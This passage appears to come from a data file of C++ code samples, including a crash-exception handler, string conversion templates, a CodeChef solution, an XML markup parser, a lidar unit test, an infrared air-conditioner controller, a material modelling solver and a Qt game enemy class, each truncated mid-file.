EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "#include \"base.h\" // Include the header file \"base.h\"\n\ntemplate<typename T> // Definition of a template function, taking a typename T as a parameter\nstd::string to_str(const T& data, const std::string& encoding) { // Definition of the function to_str, which converts data to a string using the specified encoding\n    if constexpr (std::is_same_v<T, std::string>) { // Conditional compilation based on whether T is std::string\n        return data; // Return the input data directly if it's already a string\n    } else if constexpr (std::is_same_v<T, std::vector<unsigned char>>) { // Conditional compilation based on whether T is std::vector<unsigned char>\n        return std::string(data.begin(), data.end()); // Return a string constructed from the vector of unsigned chars\n    } else if constexpr (std::is_same_v<T, const char*>) { // Conditional compilation based on whether T is const char*\n        return std::string(data); // Return a string constructed from the C-style string\n    } else if constexpr (std::is_same_v<T, const unsigned char*>) { // Conditional compilation based on whether T is const unsigned char*\n        return std::string(reinterpret_cast<const char*>(data)); // Return a string constructed from the pointer to unsigned chars, cast to a const char*\n    } else if constexpr (std::is_integral_v<T>) { // Conditional compilation based on whether T is an integral type\n        return std::to_string(data); // Return a string representation of the integral value\n    } else if constexpr (std::is_floating_point_v<T>) { // Conditional compilation based on whether T is a floating-point type\n        return std::to_string(data); // Return a string representation of the floating-point value\n    } else if constexpr (std::is_same_v<T, bool>) { // Conditional compilation based on whether T is bool\n        return data ? \"true\" : \"false\"; // Return \"true\" or \"false\" depending on the boolean value\n    } else {\n        static_assert(std::is_same_v<T, void>, \"Unsupported type for to_str()\"); // If none of the above conditions match, trigger a static assertion indicating unsupported type for to_str()\n    }\n}\n\ntemplate<typename T> // Definition of a template function, taking a typename T as a parameter\nstd::vector<unsigned char> to_bytes(const T& data, const std::string& encoding) { // Definition of the function to_bytes, which converts data to a vector of unsigned chars using the specified encoding\n    if constexpr (std::is_same_v<T, std::string>) { // Conditional compilation based on whether T is std::string\n        return std::vector<unsigned char>(data.begin(), data.end()); // Return a vector of unsigned chars constructed from the string\n    } else if constexpr (std::is_same_v<T, const char*>) { // Conditional compilation based on whether T is const char*\n        return std::vector<unsigned char>(data, data + strlen(data)); // Return a vector of unsigned chars constructed from the C-style string\n    } else if constexpr (std::is_same_v<T, const unsigned char*>) { // Conditional compilation based on whether T is const unsigned char*\n        return std::vector<unsigned char>(data, data + strlen(reinterpret_cast<const char*>(data))); // Return a vector of unsigned chars constructed from the pointer to unsigned chars, cast to a const char*\n    } else if constexpr (std::is_integral_v<T>) { // Conditional compilation based on whether T is an integral type\n        std::string str = std::to_string(data); // Convert the integral value to a string\n        return std::vector<unsigned char>(str.begin(), str.end()); // Return a vector of unsigned chars constructed from the string\n    } else if constexpr (std::is_floating_point_v<T>) { // Conditional compilation based on whether T is a floating-point type\n        std::string str = std::to_string(data); // Convert the floating-point value to a string\n        return std::vector<unsigned char>(str.begin(), str.end()); // Return a vector of unsigned chars constructed from the string\n    } else if constexpr (std::is_same_v<T, bool>) { // Conditional compilation based on whether T is bool\n        std::string str = data ? \"true\" : \"false\"; // Convert the boolean value to a string\n        return std::vector<unsigned char>(str.begin(), str.end()); // Return a vector of unsigned chars constructed from the string\n    } else {\n        static_assert(std::is_same_v<T, void>, \"Unsupported type for to_bytes()\"); // If none of the above conditions match, trigger a static assertion indicating unsupported type for to_bytes()\n    }\n}\n",
    "//PROBLEM Link: https://www.codechef.com/practice/course/strings/STRINGS/problems/HAPPYSTR\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nvoid solve(string &s) {\n    int vowels_count = 0;\n    for(int i = 0; i < s.length(); i++){\n\n        //we check if current substring window has vowel, if yes, we increment the count of vowels.\n        if(s[i] == 'a' || s[i] == 'e' || s[i] == 'i' || s[i] == 'o' || s[i] == 'u'){\n            vowels_count++;\n\n        //else, we check if the count of vowels in the current window was > 2, if yes, we already got a substring respecting the condition.\n\n        }else if(vowels_count > 2){\n            cout << \"Happy\" << endl;\n            return;\n        \n        //else, we reset our window to start from current element and reset the vowel_count to 0\n        }else{\n            vowels_count = 0;\n        }\n    }\n\n    //last check for case when all the chars in the string are vowels. so we reach the end without going to else if or else conditions.\n    if(vowels_count < 2) cout << \"Sad\" << endl;\n    else cout << \"Happy\" << endl;\n    return;\n}\n\nint main() {\n    int t;\n    cin>>t;\n    while(t--){\n        string s;\n        cin>>s;\n    \n        /** IGNORE: code to check time taken to run **/\n        time_t start, end;\n        time(&start); \n        ios_base::sync_with_stdio(false); \n        /** IGNORE: code to check time taken to run **/\n        \n\n\n        // Main Function Call\n        solve(s);\n\n\n\n        /** IGNORE: code to check time taken to run **/\n        time(&end); \n        double time_taken = double(end - start); \n        cout << \"Time taken by program is : \" << fixed \n            << time_taken << setprecision(5); \n        cout << \" sec \" << endl; \n        /** IGNORE: code to check time taken to run **/\n    }\n\n    return 0;\n}",
    "#include \"StdAfx.h\"\n\n#ifndef TRACE\n#define TRACE\n#endif\n\nnamespace DuiLib {\n///////////////////////////////////////////////////////////////////////////////////////\n//\n//\n//\nCMarkupNode::CMarkupNode() : m_pOwner(NULL)\n{\n}\n\nCMarkupNode::CMarkupNode(CMarkup* pOwner, int iPos) : m_pOwner(pOwner), m_iPos(iPos), m_nAttributes(0)\n{\n}\n\nCMarkupNode CMarkupNode::GetSibling()\n{\n    if( m_pOwner == NULL ) return CMarkupNode();\n    ULONG iPos = m_pOwner->m_pElements[m_iPos].iNext;\n    if( iPos == 0 ) return CMarkupNode();\n    return CMarkupNode(m_pOwner, iPos);\n}\n\nbool CMarkupNode::HasSiblings() const\n{\n    if( m_pOwner == NULL ) return false;\n    ULONG iPos = m_pOwner->m_pElements[m_iPos].iNext;\n    return iPos > 0;\n}\n\nCMarkupNode CMarkupNode::GetChild()\n{\n    if( m_pOwner == NULL ) return CMarkupNode();\n    ULONG iPos = m_pOwner->m_pElements[m_iPos].iChild;\n    if( iPos == 0 ) return CMarkupNode();\n    return CMarkupNode(m_pOwner, iPos);\n}\n\nCMarkupNode CMarkupNode::GetChild(LPCTSTR pstrName)\n{\n    if( m_pOwner == NULL ) return CMarkupNode();\n    ULONG iPos = m_pOwner->m_pElements[m_iPos].iChild;\n    while( iPos != 0 ) {\n        if( _tcsicmp(m_pOwner->m_pstrXML + m_pOwner->m_pElements[iPos].iStart, pstrName) == 0 ) {\n            return CMarkupNode(m_pOwner, iPos);\n        }\n        iPos = m_pOwner->m_pElements[iPos].iNext;\n    }\n    return CMarkupNode();\n}\n\nbool CMarkupNode::HasChildren() const\n{\n    if( m_pOwner == NULL ) return false;\n    return m_pOwner->m_pElements[m_iPos].iChild != 0;\n}\n\nCMarkupNode CMarkupNode::GetParent()\n{\n    if( m_pOwner == NULL ) return CMarkupNode();\n    ULONG iPos = m_pOwner->m_pElements[m_iPos].iParent;\n    if( iPos == 0 ) return CMarkupNode();\n    return CMarkupNode(m_pOwner, iPos);\n}\n\nbool CMarkupNode::IsValid() const\n{\n    return m_pOwner != NULL;\n}\n\nLPCTSTR CMarkupNode::GetName() const\n{\n    if( m_pOwner == NULL ) return NULL;\n    return m_pOwner->m_pstrXML + m_pOwner->m_pElements[m_iPos].iStart;\n}\n\nLPCTSTR CMarkupNode::GetValue() const\n{\n    if( m_pOwner == NULL ) return NULL;\n    return m_pOwner->m_pstrXML + m_pOwner->m_pElements[m_iPos].iData;\n}\n\nLPCTSTR CMarkupNode::GetAttributeName(int iIndex)\n{\n    if( m_pOwner == NULL ) return NULL;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    if( iIndex < 0 || iIndex >= m_nAttributes ) return _T(\"\");\n    return m_pOwner->m_pstrXML + m_aAttributes[iIndex].iName;\n}\n\nLPCTSTR CMarkupNode::GetAttributeValue(int iIndex)\n{\n    if( m_pOwner == NULL ) return NULL;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    if( iIndex < 0 || iIndex >= m_nAttributes ) return _T(\"\");\n    return m_pOwner->m_pstrXML + m_aAttributes[iIndex].iValue;\n}\n\nLPCTSTR CMarkupNode::GetAttributeValue(LPCTSTR pstrName)\n{\n    if( m_pOwner == NULL ) return NULL;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    for( int i = 0; i < m_nAttributes; i++ ) {\n        if( _tcsicmp(m_pOwner->m_pstrXML + m_aAttributes[i].iName, pstrName) == 0 ) return m_pOwner->m_pstrXML + m_aAttributes[i].iValue;\n    }\n    return _T(\"\");\n}\n\nbool CMarkupNode::GetAttributeValue(int iIndex, LPTSTR pstrValue, SIZE_T cchMax)\n{\n    if( m_pOwner == NULL ) return false;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    if( iIndex < 0 || iIndex >= m_nAttributes ) return false;\n    _tcsncpy(pstrValue, m_pOwner->m_pstrXML + m_aAttributes[iIndex].iValue, cchMax);\n    return true;\n}\n\nbool CMarkupNode::GetAttributeValue(LPCTSTR pstrName, LPTSTR pstrValue, SIZE_T cchMax)\n{\n    if( m_pOwner == NULL ) return false;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    for( int i = 0; i < m_nAttributes; i++ ) {\n        if( _tcsicmp(m_pOwner->m_pstrXML + m_aAttributes[i].iName, pstrName) == 0 ) {\n            _tcsncpy(pstrValue, m_pOwner->m_pstrXML + m_aAttributes[i].iValue, cchMax);\n            return true;\n        }\n    }\n    return false;\n}\n\nint CMarkupNode::GetAttributeCount()\n{\n    if( m_pOwner == NULL ) return 0;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    return m_nAttributes;\n}\n\nbool CMarkupNode::HasAttributes()\n{\n    if( m_pOwner == NULL ) return false;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    return m_nAttributes > 0;\n}\n\nbool CMarkupNode::HasAttribute(LPCTSTR pstrName)\n{\n    if( m_pOwner == NULL ) return false;\n    if( m_nAttributes == 0 ) _MapAttributes();\n    for( int i = 0; i < m_nAttributes; i++ ) {\n        if( _tcsicmp(m_pOwner->m_pstrXML + m_aAttributes[i].iName, pstrName) == 0 ) return true;\n    }\n    return false;\n}\n\nvoid CMarkupNode::_MapAttributes()\n{\n    m_nAttributes = 0;\n    LPCTSTR pstr = m_pOwner->m_pstrXML + m_pOwner->m_pElements[m_iPos].iStart;\n    LPCTSTR pstrEnd = m_pOwner->m_pstrXML + m_pOwner->m_pElements[m_iPos].iData;\n    pstr += _tcslen(pstr) + 1;\n    while( pstr < pstrEnd ) {\n        m_pOwner->_SkipWhitespace(pstr);\n        m_aAttributes[m_nAttributes].iName = pstr - m_pOwner->m_pstrXML;\n        pstr += _tcslen(pstr) + 1;\n        m_pOwner->_SkipWhitespace(pstr);\n        if( *pstr++ != _T('\\\"') ) return; // if( *pstr != _T('\\\"') ) { pstr = ::CharNext(pstr); return; }\n  ",
    "/**\n * Copyright (c) 2023, Ouster, Inc.\n * All rights reserved.\n */\n\n#include \"ouster/impl/packet_writer.h\"\n\n#include <gtest/gtest.h>\n\n#include <algorithm>\n#include <numeric>\n\n#include \"ouster/lidar_scan.h\"\n#include \"ouster/pcap.h\"\n#include \"util.h\"\n\nusing namespace ouster;\nusing namespace ouster::sensor;\nusing namespace ouster::sensor::impl;\n\n// TODO: we should just make FieldInfo's publicly available\nnamespace ouster {\nnamespace sensor {\nnamespace impl {\n\nstruct FieldInfo {\n    ChanFieldType ty_tag;\n    size_t offset;\n    uint64_t mask;\n    int shift;\n};\n\nstruct ProfileEntry {\n    const std::pair<ChanField, FieldInfo>* fields;\n    size_t n_fields;\n    size_t chan_data_size;\n};\n\ntemplate <typename K, typename V, size_t N>\nusing Table = std::array<std::pair<K, V>, N>;\n\nextern Table<UDPProfileLidar, ProfileEntry, MAX_NUM_PROFILES> profiles;\n\nuint64_t get_value_mask(const FieldInfo& f);\nint get_bitness(const FieldInfo& f);\n\nstd::map<ChanField, FieldInfo> get_fields(UDPProfileLidar profile) {\n    auto end = profiles.end();\n    auto it =\n        std::find_if(impl::profiles.begin(), end,\n                     [profile](const auto& kv) { return kv.first == profile; });\n\n    auto& entry = it->second;\n    return {entry.fields, entry.fields + entry.n_fields};\n}\n\n}  // namespace impl\n}  // namespace sensor\n}  // namespace ouster\n\nusing bitness_param = std::tuple<UDPProfileLidar, std::map<ChanField, int>>;\nclass FieldInfoSanityTest : public ::testing::TestWithParam<bitness_param> {};\n\n// clang-format off\nINSTANTIATE_TEST_CASE_P(\n    FieldInfoSanityTests,\n    FieldInfoSanityTest,\n    ::testing::Values(\n        bitness_param{UDPProfileLidar::PROFILE_LIDAR_LEGACY,\n                      {{ChanField::RANGE, 20},\n                       {ChanField::FLAGS, 4},\n                       {ChanField::REFLECTIVITY, 16},\n                       {ChanField::SIGNAL, 16},\n                       {ChanField::NEAR_IR, 16},\n                       {ChanField::RAW32_WORD1, 32},\n                       {ChanField::RAW32_WORD2, 32},\n                       {ChanField::RAW32_WORD3, 32}}},\n        bitness_param{UDPProfileLidar::PROFILE_RNG15_RFL8_NIR8,\n                      {{ChanField::RANGE, 15},\n                       {ChanField::FLAGS, 1},\n                       {ChanField::REFLECTIVITY, 8},\n                       {ChanField::NEAR_IR, 8},\n                       {ChanField::RAW32_WORD1, 32}}},\n        bitness_param{UDPProfileLidar::PROFILE_RNG19_RFL8_SIG16_NIR16,\n                      {{ChanField::RANGE, 19},\n                       {ChanField::FLAGS, 5},\n                       {ChanField::REFLECTIVITY, 8},\n                       {ChanField::SIGNAL, 16},\n                       {ChanField::NEAR_IR, 16},\n                       {ChanField::RAW32_WORD1, 32},\n                       {ChanField::RAW32_WORD2, 32},\n                       {ChanField::RAW32_WORD3, 32}}},\n        bitness_param{UDPProfileLidar::PROFILE_RNG19_RFL8_SIG16_NIR16_DUAL,\n                      {{ChanField::RANGE, 19},\n                       {ChanField::FLAGS, 5},\n                       {ChanField::REFLECTIVITY, 8},\n                       {ChanField::RANGE2, 19},\n                       {ChanField::FLAGS2, 5},\n                       {ChanField::REFLECTIVITY2, 8},\n                       {ChanField::SIGNAL, 16},\n                       {ChanField::SIGNAL2, 16},\n                       {ChanField::NEAR_IR, 16},\n                       {ChanField::RAW32_WORD1, 32},\n                       {ChanField::RAW32_WORD2, 32},\n                       {ChanField::RAW32_WORD3, 32},\n                       {ChanField::RAW32_WORD4, 32}}},\n        bitness_param{UDPProfileLidar::PROFILE_FUSA_RNG15_RFL8_NIR8_DUAL,\n                      {{ChanField::RANGE, 15},\n                       {ChanField::FLAGS, 1},\n                       {ChanField::REFLECTIVITY, 8},\n                       {ChanField::RANGE2, 15},\n                       {ChanField::FLAGS2, 1},\n                       {ChanField::REFLECTIVITY2, 8},\n                       {ChanField::NEAR_IR, 8},\n                       {ChanField::RAW32_WORD1, 32},\n                       {ChanField::RAW32_WORD2, 32}}}));\n// clang-format on\n\nTEST_P(FieldInfoSanityTest, field_info_sanity_checks) {\n    auto param = GetParam();\n    UDPProfileLidar profile = std::get<0>(param);\n    auto chan_bitness_map = std::get<1>(param);\n\n    auto fields = get_fields(profile);\n\n    for (const auto& kv : fields) {\n        auto f = kv.second;\n        uint64_t type_mask =\n            (uint64_t{1} << (field_type_size(f.ty_tag) * 8)) - 1;\n        uint64_t value_mask = get_value_mask(f);\n\n        EXPECT_EQ(get_bitness(f), chan_bitness_map[kv.first]);\n        if (f.shift < 0) {\n            if (f.mask) {\n                EXPECT_EQ(value_mask, f.mask << std::abs(f.shift));\n            } else {\n                EXPECT_EQ(value_mask, type_mask << std::abs(f.shift));\n            }\n        } else {\n            if (f.mask) {\n                EXPECT_EQ(value_mask, f.mask >> f.shift);\n            } else {\n      ",
    "// Copyright 2019 David Conran\n\n// Provide a universal/standard interface for sending A/C nessages.\n// It does not provide complete and maximum granular control but tries\n// to offer most common functionality across all supported devices.\n\n#include \"IRac.h\"\n#ifndef UNIT_TEST\n#include <Arduino.h>\n#endif\n#include <string.h>\n#ifndef ARDUINO\n#include <string>\n#endif\n#include \"IRsend.h\"\n#include \"IRremoteESP8266.h\"\n#include \"IRtext.h\"\n#include \"IRutils.h\"\n#include \"ir_Airton.h\"\n#include \"ir_Airwell.h\"\n#include \"ir_Amcor.h\"\n#include \"ir_Argo.h\"\n#include \"ir_Carrier.h\"\n#include \"ir_Coolix.h\"\n#include \"ir_Corona.h\"\n#include \"ir_Daikin.h\"\n#include \"ir_Ecoclim.h\"\n#include \"ir_Electra.h\"\n#include \"ir_Fujitsu.h\"\n#include \"ir_Haier.h\"\n#include \"ir_Hitachi.h\"\n#include \"ir_Kelon.h\"\n#include \"ir_Kelvinator.h\"\n#include \"ir_LG.h\"\n#include \"ir_Midea.h\"\n#include \"ir_Mitsubishi.h\"\n#include \"ir_MitsubishiHeavy.h\"\n#include \"ir_Neoclima.h\"\n#include \"ir_Panasonic.h\"\n#include \"ir_Rhoss.h\"\n#include \"ir_Samsung.h\"\n#include \"ir_Sanyo.h\"\n#include \"ir_Sharp.h\"\n#include \"ir_Tcl.h\"\n#include \"ir_Technibel.h\"\n#include \"ir_Teco.h\"\n#include \"ir_Toshiba.h\"\n#include \"ir_Transcold.h\"\n#include \"ir_Trotec.h\"\n#include \"ir_Truma.h\"\n#include \"ir_Vestel.h\"\n#include \"ir_Voltas.h\"\n#include \"ir_Whirlpool.h\"\n\n// On the ESP8266 platform we need to use a special version of string handling\n// functions to handle the strings stored in the flash address space.\n#ifndef STRCASECMP\n#if defined(ESP8266)\n#define STRCASECMP(LHS, RHS) \\\n    strcasecmp_P(LHS, reinterpret_cast<const char*>(RHS))\n#else  // ESP8266\n#define STRCASECMP(LHS, RHS) strcasecmp(LHS, RHS)\n#endif  // ESP8266\n#endif  // STRCASECMP\n\n/// Class constructor\n/// @param[in] pin Gpio pin to use when transmitting IR messages.\n/// @param[in] inverted true, gpio output defaults to high. false, to low.\n/// @param[in] use_modulation true means use frequency modulation. false, don't.\nIRac::IRac(const uint16_t pin, const bool inverted, const bool use_modulation) {\n  _pin = pin;\n  _inverted = inverted;\n  _modulation = use_modulation;\n  this->markAsSent();\n}\n\n/// Initialise the given state with the supplied settings.\n/// @param[out] state A Ptr to where the settings will be stored.\n/// @param[in] vendor The vendor/protocol type.\n/// @param[in] model The A/C model if applicable.\n/// @param[in] power The power setting.\n/// @param[in] mode The operation mode setting.\n/// @param[in] degrees The temperature setting in degrees.\n/// @param[in] celsius Temperature units. True is Celsius, False is Fahrenheit.\n/// @param[in] fan The speed setting for the fan.\n/// @param[in] swingv The vertical swing setting.\n/// @param[in] swingh The horizontal swing setting.\n/// @param[in] quiet Run the device in quiet/silent mode.\n/// @param[in] turbo Run the device in turbo/powerful mode.\n/// @param[in] econo Run the device in economical mode.\n/// @param[in] light Turn on the LED/Display mode.\n/// @param[in] filter Turn on the (ion/pollen/etc) filter mode.\n/// @param[in] clean Turn on the self-cleaning mode. e.g. Mould, dry filters etc\n/// @param[in] beep Enable/Disable beeps when receiving IR messages.\n/// @param[in] sleep Nr. of minutes for sleep mode.\n///  -1 is Off, >= 0 is on. Some devices it is the nr. of mins to run for.\n///  Others it may be the time to enter/exit sleep mode.\n///  i.e. Time in Nr. of mins since midnight.\n/// @param[in] clock The time in Nr. of mins since midnight. < 0 is ignore.\nvoid IRac::initState(stdAc::state_t *state,\n                     const decode_type_t vendor, const int16_t model,\n                     const bool power, const stdAc::opmode_t mode,\n                     const float degrees, const bool celsius,\n                     const stdAc::fanspeed_t fan,\n                     const stdAc::swingv_t swingv, const stdAc::swingh_t swingh,\n                     const bool quiet, const bool turbo, const bool econo,\n                     const bool light, const bool filter, const bool clean,\n                     const bool beep, const int16_t sleep,\n                     const int16_t clock) {\n  state->protocol = vendor;\n  state->model = model;\n  state->power = power;\n  state->mode = mode;\n  state->degrees = degrees;\n  state->celsius = celsius;\n  state->fanspeed = fan;\n  state->swingv = swingv;\n  state->swingh = swingh;\n  state->quiet = quiet;\n  state->turbo = turbo;\n  state->econo = econo;\n  state->light = light;\n  state->filter = filter;\n  state->clean = clean;\n  state->beep = beep;\n  state->sleep = sleep;\n  state->clock = clock;\n}\n\n/// Initialise the given state with the supplied settings.\n/// @param[out] state A Ptr to where the settings will be stored.\n/// @note Sets all the parameters to reasonable base/automatic defaults.\nvoid IRac::initState(stdAc::state_t *state) {\n  stdAc::state_t def;\n  *state = def;\n}\n\n/// Get the current internal A/C climate state.\n/// @return A Ptr to a state containing the current (to be sent) settings.\nstdAc::state_t IRac::getState(void) { return next; }\n\n/// Get the previous int",
    "#include <iostream>\n#include <math.h>\n#include <chrono>\n#include <limits>\n#include <fstream>\n\n#include \"omp.h\"\n#include \"consts.h\"\n#include \"helpers.h\"\n#include \"mkl.h\"\n\nusing namespace std;\n\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////MODELING PART STARTS//////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\nclass FGM;\n\nstruct Space {\npublic:\n  dtype start;\n  dtype end;\n  int no_points;\n\n  Mat<dtype> IT; //Inverse transformation matrix\n  Mat<dtype> FT; //forward transformation matrix so FT = inv(IT)\n  Mat<dtype> D;\n  Col<dtype> s;\n  Mat<dtype> V;\n  Mat<dtype> Q1;\n\n  Space(dtype start, dtype end, int no_points)\n    : start(start), end(end), no_points(no_points), IT(no_points, no_points), FT(no_points, no_points), D(no_points, no_points), s(no_points) {\n    discretize();\n  }\n\n  void discretize() {\n    cheb(no_points, IT, FT);\n    DBG(cout << \"IT\\n\"; IT.print(); cout << endl;);\n    DBG(cout << \"FT\\n\"; FT.print(); cout << endl;);\n    derivative(start, end, no_points, D);\n    DBG(cout << \"D\\n\";D.print(); cout << endl;);\n    slobat(start, end, no_points, s);\n    DBG(cout << \"s\\n\"; s.print(); cout << endl;);\n    inner_product_helper(start, end, no_points, V);\n    DBG(cout << \"V\\n\"; V.print(); cout << endl;);\n    Q1 = IT * D * FT;\n    DBG(cout << \"Q1\\n\"; Q1.print(); cout << endl;);\n  }\n};\n\nclass Shape { //Space(0, z_dim, z_sample) neden b\u00f6yle de Space(-z_dim/2, z_dim/2, z_sample) de\u011fil??????\npublic:\n  Shape(dtype x_dim, dtype y_dim, dtype z_dim,\n\tint x_sample, int y_sample, int z_sample,\n\tdtype xcurve = 0, dtype ycurve = 0) :\n    dim{x_dim, y_dim, z_dim}, curve{xcurve, ycurve},\n    is_curved(~(xcurve == 0 && ycurve == 0)),\n    spaces{Space(-x_dim/2, x_dim/2, x_sample), Space(-y_dim/2, y_dim/2, y_sample), Space(0, z_dim, z_sample)},\n    xyz(x_sample * y_sample * z_sample),\n    VD(xyz, xyz),\n    QDx(xyz, xyz, fill::zeros), QDy(xyz, xyz, fill::zeros), QDz(xyz, xyz, fill::zeros) {\n      vector_map_nojac();\n  }\n\n  void vector_map_nojac() {\n    int npx = spaces[0].no_points;\n    int npy = spaces[1].no_points;\n    int npz = spaces[2].no_points;\n\n    int xyz = npx * npy * npz;\n    Mat<dtype> VDx(xyz, xyz, fill::zeros);\n    Mat<dtype> VDy(xyz, xyz, fill::zeros);\n    Mat<dtype> VDz(xyz, xyz, fill::zeros);\n\n    for(int i = 1; i <= npx; i++) {\n      for(int j = 1; j <= npy; j++) {\n\t      for(int k = 1; k <= npz; k++) {\n\t        int I = ((i-1) * npy * npz) + ((j-1) * npz) + k;\n\n          for(int l = 1; l <= npx; l++) {\n            int J = ((l-1) * npy * npz) + ((j-1) * npz) + k;\n            VDx(J-1, I-1) += spaces[0].V(l-1, i-1);\n            QDx(J-1, I-1) += spaces[0].Q1(l-1, i-1);\n          }\n\n          for(int l = 1; l <= npy; l++) {\n            int J = ((i-1) * npy * npz) + ((l-1) * npz) + k;\n            VDy(J-1, I-1) += spaces[1].V(l-1, j-1);\n            QDy(J-1, I-1) += spaces[1].Q1(l-1, j-1);\n          }\n\n          for(int l = 1; l <= npz; l++) {\n            int J = ((i-1) * npy * npz) + ((j-1) * npz) + l;\n            VDz(J-1, I-1) += spaces[2].V(l-1, k-1);\n            QDz(J-1, I-1) += spaces[2].Q1(l-1, k-1);\n          }\n\t      }\n      }\n    }\n\n    VD = VDx * VDy * VDz;\n  }\n\n  const dtype dim[3];\n  const bool is_curved;\n  const dtype curve[2];\n\n  Space spaces[3];\n\n  const int xyz;\n  Mat<dtype> VD;\n  Mat<dtype> QDx;\n  Mat<dtype> QDy;\n  Mat<dtype> QDz;\n};\n\nclass Material {\npublic:\n  Material(dtype _mod_elasticity,\n\t   dtype _poisson_ratio,\n\t   dtype _density)\n    : mod_elasticity(_mod_elasticity),\n      poisson_ratio(_poisson_ratio),\n      density(_density) {}\n\n  //member variables\n  const dtype mod_elasticity;\n  const dtype poisson_ratio;\n  const dtype density;\n};\n\n//Functionally graded material\nclass FGM {\npublic:\n  FGM(Shape& _shape,\n      Material& first, Material& second,\n      dtype _ctrl_y, dtype _ctrl_z) :\n    shape(_shape),\n    ctrl_y(_ctrl_y), ctrl_z(_ctrl_z),\n    mats{first, second},\n    np{_shape.spaces[0].no_points, _shape.spaces[1].no_points, _shape.spaces[2].no_points},\n    nxyz(np[0] * np[1] * np[2]),\n    mu(np[0], np[1], np[2], fill::zeros),\n    lame(np[0], np[1], np[2], fill::zeros),\n    rho(np[0], np[1], np[2], fill::zeros),\n    VD_mu(nxyz, nxyz, fill::zeros),\n    VD_lame(nxyz, nxyz, fill::zeros),\n    VD_rho(nxyz, nxyz, fill::zeros),\n    M(3 * nxyz, 3 * nxyz, fill::zeros),\n    K(3 * nxyz, 3 * nxyz, fill::zeros)\n  {\n    FG_var_MT();\n    inner_product();\n\n    double start, end;\n    TIME(\"system-mat\", start, end,\n\t  system_matrices()\n\t );\n  }\n\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////MODELING PART ENDS//////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n  void compute(const int no",
    "#include \"enemy.h\"\n#include \"game.h\"\n#include <QPixmap>\n#include <QTimer>\n#include <QTime>\n#include <qmath.h>\n#include <QDebug>\n#include <QGraphicsScene>\n#include \"worker.h\"\n#include \"graph.h\"\n#include <QMediaPlayer>\n#include <QAudioOutput>\n\nextern Game* game;\n\nEnemy::Enemy(int x, int y)\n{\n    // set the picture\n\n    imgLen = 48;\n    QPixmap enemyImg(\":/images/img/enemy/enemy.png\");\n    enemyImg = enemyImg.scaled(imgLen, imgLen);\n    setPixmap(enemyImg);\n    setTransformOriginPoint(imgLen/2.0,imgLen/2.0);\n    offsetX = boundingRect().width()/2.0;\n    offsetY = boundingRect().height()/2.0;\n\n    setPos(x, y);\n    // qDebug() << x << \" \" << y ;\n\n    //spawn sound\n    game->playSound(QUrl(\"qrc:/audio/audio/spawn.mp3\"));\n\n    setZValue(3);\n    // set the postion\n    castle = game->getCastle();\n    health = healthVal[game->getLevel()];\n    damage = damageVal[game->getLevel()];\n    STEP_SIZE = velocity[game->getLevel()]; // this represents the velocity of enemy\n    healthBar = new HealthBar(x, y, imgLen, health, true);\n    isHealthBarShown = false;\n\n    //current position\n    // curr =1;\n    // row =y/50;\n    // col =x/50;\n    setCurr(1);\n    setRow(y/50);\n    setCol(x/50);\n\n    path = game->graph->aStarAlgo(game->graph->findNode(row, col), game->graph->findNode(castle->getRow(),castle->getCol()));\n\n    // fill walkImgs QStringList\n    walkImgs.append(\":/images/img/enemy/walk/1.png\");\n    walkImgs.append(\":/images/img/enemy/walk/2.png\");\n    // walkImgs.append(\":/images/img/enemy/walk/3.png\");\n    // walkImgs.append(\":/images/img/enemy/walk/4.png\");\n    // walkImgs.append(\":/images/img/enemy/walk/5.png\");\n    walkImgs.append(\":/images/img/enemy/walk/6.png\");\n    walkImgs.append(\":/images/img/enemy/walk/7.png\");\n\n    // fill the attackImgs QStringList\n    attackImgs.append(\":/images/img/enemy/enemy.png\");\n    attackImgs.append(\":/images/img/enemy/attack/1.png\");\n    attackImgs.append(\":/images/img/enemy/attack/2.png\");\n    attackImgs.append(\":/images/img/enemy/attack/3.png\");\n    attackImgs.append(\":/images/img/enemy/attack/4.png\");\n\n    // timers\n    attackTimer = new QTimer(this);\n    connect(attackTimer, &QTimer::timeout, [this]() {\n        static int i = 0;\n        if(!attackImgs.isEmpty()) setPixmap(QPixmap(attackImgs[i]).scaled(imgLen,imgLen));\n        i = (i + 1) % attackImgs.size();\n    });\n    walkTimer = new QTimer(this);\n    connect(walkTimer, &QTimer::timeout, [this]() {\n        static int i = 0;\n        if(!walkImgs.isEmpty()) setPixmap(QPixmap(walkImgs[i]).scaled(imgLen, imgLen));\n        i = (i + 1) % walkImgs.size();\n    });\n    damageTimer = new QTimer(this);\n    moveTimer = new QTimer(this);\n    // connect(moveTimer, 